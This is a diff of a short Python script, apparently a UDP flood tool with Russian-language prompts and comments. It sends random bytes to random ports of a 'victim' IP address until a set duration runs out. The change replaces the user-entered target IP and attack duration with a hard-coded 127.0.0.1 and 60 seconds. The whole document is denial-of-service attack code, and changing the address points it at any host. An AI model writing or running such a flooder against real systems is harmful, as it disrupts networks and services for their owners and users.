@@ -4,14 +4,14 @@ import socket
 import random
 import sys
 
-victim_ip = str(input('IP - адрес атакуемого хоста: '))
-duration = int(input('Продолжительность атаки (с): '))
+victim_ip = '127.0.0.1'
+duration = 60 # в секундах
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 msg = bytes(random.getrandbits(10))
 timeout = time.time() + duration
-sent_packets = 0
 
+sent_packets = 0
 while time.time() < timeout:
   victim_port = random.randint(1025, 65356)
   sock.sendto(msg, (victim_ip, victim_port))
